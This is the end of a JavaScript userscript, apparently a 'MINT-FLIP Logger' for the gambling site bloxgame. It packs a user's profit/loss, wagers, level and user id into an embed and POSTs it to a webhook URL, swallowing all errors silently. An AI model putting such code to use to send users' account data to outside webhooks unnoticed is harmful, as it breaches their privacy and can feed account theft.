                            { name: profitLoss.includes('(') ? '📉 Profit/Loss' : '📈 Profit/Loss', value: `\`\`\`$${formatNumber(profitLoss)}\`\`\``, inline: true },
                            { name: '🎰 Wager Stats', value: '━━━━━━━━━━━━━━━━━━━━', inline: false },
                            { name: '📊 Total Wager', value: `\`\`\`$${formatNumber(totalWager)}\`\`\``, inline: true },
                            { name: '📈 Gross Wagers', value: `\`\`\`$${formatNumber(grossWager)}\`\`\``, inline: true },
                            { name: '⏰ Time', value: `\`\`\`${timeString}\`\`\``, inline: false }
                        ],
                        footer: {
                            text: `MINT-FLIP Logger • Level ${level}`,
                            icon_url: `https://api.bloxgame.com/user/avatar/${uid}`
                        },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
            })
            .catch(() => {});
    }
})();
